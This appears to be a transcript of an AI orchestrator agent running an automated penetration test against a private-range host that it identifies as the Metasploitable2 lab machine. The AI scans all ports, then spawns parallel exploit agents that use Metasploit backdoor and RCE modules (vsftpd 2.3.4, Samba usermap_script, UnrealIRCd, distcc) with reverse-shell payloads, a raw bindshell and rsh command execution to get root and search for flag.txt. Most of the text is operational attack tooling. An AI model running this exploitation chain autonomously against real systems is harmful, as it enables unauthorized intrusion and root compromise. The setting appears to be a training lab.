messages.content: Mission target: 192.168.56.101. Begin the engagement now. Spawn the appropriate first agent.

{"thought": "SITUATION: New engagement starting against 192.168.56.101. No prior scan data exists — I have zero knowledge of open ports, running services, or OS. The target environment is listed as 'unknown'. Mission objective: find flag.txt. Permissions allow exploitation and lateral movement, post-exploitation, and credential harvest. PHASE: Starting at OSINT/recon, need to move to scanning immediately. DECISION: The only rational first action is a comprehensive port scan. I must enumerate ALL open ports (full TCP range), service versions, OS fingerprint, and run default NSE scripts. Without scan data, any exploit attempt would be guessing. I will spawn a scanner agent with aggressive settings: full TCP SYN scan, version detection (-sV), OS detection (-O), default scripts (-sC), and UDP scan of common ports. This single scan will give me the complete picture needed to make parallel exploit decisions. I will NOT spawn exploit agents yet — I have no findings to base them on. Spawning scanner now.", "situation": "Target 192.168.56.101 — no prior data. Phase: initial reconnaissance.", "hypothesis": "Unknown target profile. Full port scan required before any attack hypothesis can be formed.", "decision": "Spawn a comprehensive TCP+UDP scanner against 192.168.56.101. Full port range, version detection, OS fingerprinting, NSE scripts. This is the mandatory foundation step.", "action": "spawn_agent", "parameters": {"agent_type": "scanner", "target": "192.168.56.101", "task_type": "full_scan", "options": {"ports": "1-65535", "udp_ports": "161,53,69,123,137,138,500,1900,2049,4500", "flags": "-sV -sC -O --open", "timeout": 1200}}}

{"thought": "SITUATION: Scanner agent scanner-c27b35f9 has been spawned and is running against 192.168.56.101. I now need to wait for it to complete. There's also an existing scanner agent from the mission state (scanner-c27b35f9) which is the same one I just confirmed. I should wait for all running agents to complete before making any exploit decisions. No scan results yet — nothing to act on. DECISION: Call wait_for_agents with 'all' to wait for the scanner to finish. Timeout set to 1200s as specified for scanner agents.", "action": "wait_for_agents", "parameters": {"agent_ids": "all", "timeout": 1200}}

{"thought": "SITUATION: Scan of 192.168.56.101 complete. This is the classic Metasploitable2 target with 26+ open ports. Let me map every critical service:

- PORT 21: vsftpd 2.3.4 → CVE-2011-2523 (CRITICAL — deliberate backdoor, opens root shell on port 6200)
- PORT 22: OpenSSH 4.7p1 Debian — old, worth credential spray after getting creds
- PORT 23: Telnet — try blank/default creds
- PORT 80: Apache httpd 2.2.8 — web scan needed
- PORT 139/445: Samba 3.0.20-Debian → CVE-2007-2447 (CRITICAL — usermap_script, unauthenticated root RCE) — confirmed in my playbook
- PORT 512/513/514: r-services (rexec/rlogin/rsh) → unauthenticated root shell possible via rsh_exec
- PORT 1524: bindshell — labeled 'Metasploitable root shell' — this is a raw TCP root shell listener! Direct connection = instant root. Use bindshell_exec.
- PORT 2049: NFS — showmount and mount for sensitive files
- PORT 3306: MySQL 5.0.51a — try root with blank password
- PORT 3632: distccd v1 → CVE-2004-2687 (HIGH — arbitrary command execution) — confirmed in my playbook
- PORT 5432: PostgreSQL 8.3.x — try postgres with blank password
- PORT 5900: VNC — try blank password
- PORT 6667/6697: UnrealIRCd → CVE-2010-2075 (CRITICAL — backdoor, root RCE) — confirmed in my playbook
- PORT 8180: Apache Tomcat — check for default manager credentials

PRIORITY ORDER:
1. Port 1524 (bindshell) — labeled 'Metasploitable root shell' — this is INSTANT root, no exploit needed. Just connect and execute commands. Highest priority.
2. vsftpd 2.3.4 on port 21 — backdoor CVE, proven in playbook
3. Samba 3.0.20 on port 445 — usermap_script, proven in playbook
4. UnrealIRCd on port 6667 — backdoor CVE, proven in playbook
5. distccd on port 3632 — CVE-2004-2687, proven in playbook
6. r-services on ports 512/513/514 — potential zero-auth root
7. Web scans on port 80 and 8180

DECISION: Spawn ALL viable vectors in parallel using spawn_agents_batch. Port 1524 is the fastest path — it's literally labeled 'Metasploitable root shell'. I'll spawn a post_exploit agent for bindshell_exec on 1524 AND all other exploit agents simultaneously.

For port 1524: use post_exploit agent with bindshell_exec action.
For all others: exploit agents with appropriate task_types.
For web: webapp agents for ports 80 and 8180.

All port numbers taken DIRECTLY from scan findings. task_type suffixes match options.port exactly.", "situation": "192.168.56.101 confirmed up with 26 open ports. Classic Metasploitable2 profile. Multiple CRITICAL vectors identified: port 1524 (raw root shell), vsftpd 2.3.4 backdoor, Samba 3.0.20 usermap_script, UnrealIRCd backdoor, distccd RCE, r-services zero-auth.", "hypothesis": "Port 1524 is a raw TCP root shell listener — direct bindshell_exec will yield instant root. vsftpd 2.3.4, Samba 3.0.20, and UnrealIRCd are all known backdoored/exploitable versions. Multiple parallel paths to root exist. First shell + flag.txt = mission done.", "decision": "spawn_agents_batch with ALL viable attack vectors in parallel. Port numbers taken directly from scan findings. Port 1524 bindshell is priority #1 — it's labeled 'Metasploitable root shell' by nmap itself.", "action": "spawn_agents_batch", "parameters": {"agents": [{"agent_type": "exploit", "target": "192.168.56.101", "task_type": "exploit_bindshell_1524", "options": {"port": 1524, "action": "bindshell_exec", "commands": ["id", "whoami", "hostname", "cat /root/flag.txt 2>/dev/null", "cat /home/*/flag.txt 2>/dev/null", "find / -name 'flag*' -o -name 'flag.txt' 2>/dev/null | head -20"]}}, {"agent_type": "exploit", "target": "192.168.56.101", "task_type": "exploit_vsftpd_21", "options": {"port": 21, "module": "exploit/unix/ftp/vsftpd_234_backdoor", "payload": "cmd/unix/interact"}}, {"agent_type": "exploit", "target": "192.168.56.101", "task_type": "exploit_samba_445", "options": {"port": 445, "module": "exploit/multi/samba/usermap_script", "payload": "cmd/unix/reverse"}}, {"agent_type": "exploit", "target": "192.168.56.101", "task_type": "exploit_unrealircd_6667", "options": {"port": 6667, "module": "exploit/unix/irc/unreal_ircd_3281_backdoor", "payload": "cmd/unix/reverse"}}, {"agent_type": "exploit", "target": "192.168.56.101", "task_type": "exploit_distcc_3632", "options": {"port": 3632, "module": "exploit/unix/misc/distcc_exec", "payload": "cmd/unix/reverse"}}, {"agent_type": "exploit", "target": "192.168.56.101", "task_type": "exploit_rsh_514", "options": {"port": 514, "action": "rsh_exec", "commands": ["id", "cat /root/flag.txt 2>/dev/null", "cat /home/*/flag.txt 2>/dev/null", "find / -name 'flag*' 2>/dev/null | head -20"]}}, {"agent_type": "webapp", "target": "192.168.56.101", "task_type": "web_scan_80", "options": {"port": 80}}, {"agent_type": "webapp", "target": "192.168.56.101", "task_type": "web_scan_8180", "options": {"port": 8180}}]}}
